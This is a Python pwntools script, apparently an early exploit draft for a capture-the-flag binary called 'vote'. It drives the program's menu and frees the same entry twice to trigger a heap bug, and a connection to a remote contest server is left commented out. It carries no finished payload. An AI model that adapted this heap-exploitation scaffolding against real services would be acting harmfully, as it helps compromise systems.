#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level = "DEBUG"


class Pwn:
    def __init__(self):
        self.libc = ELF("./libc-2.23.so")
        self.e = ELF("./vote")
        self.p = None

    def start_binary(self):
#        self.p = remote("47.97.190.1", 6000)
        self.p = process(["./vote"])
        self.p.recvuntil("Action: ")

    def create(self, name, size):
        self.p.sendline("0")
        self.p.recvuntil("size: ")
        self.p.sendline(str(size))
        self.p.recvuntil("name: ")
        self.p.sendline(name)
        self.p.recvuntil("Action: ")

    def show(self, index):
        self.p.sendline("1")
        self.p.recvuntil("index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Action: ")

    def vote(self, index):
        self.p.sendline("2")
        self.p.recvuntil("index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Action: ")

    def result(self):
        self.p.sendline("3")
        self.p.recvuntil("Action: ")

    def cancel(self, index):
        self.p.sendline("4")
        self.p.recvuntil("index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Action: ")

    def exit(self):
        self.p.sendline("5")

    def pwn_binary(self):
        self.start_binary()

        for i in xrange(0, 5):
            self.create("A"*100, 100)
        self.show(3)
        for i in xrange(0, 15):
            self.vote(i)
        self.result()
        self.cancel(0)
        self.cancel(0)
        self.exit()

#        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
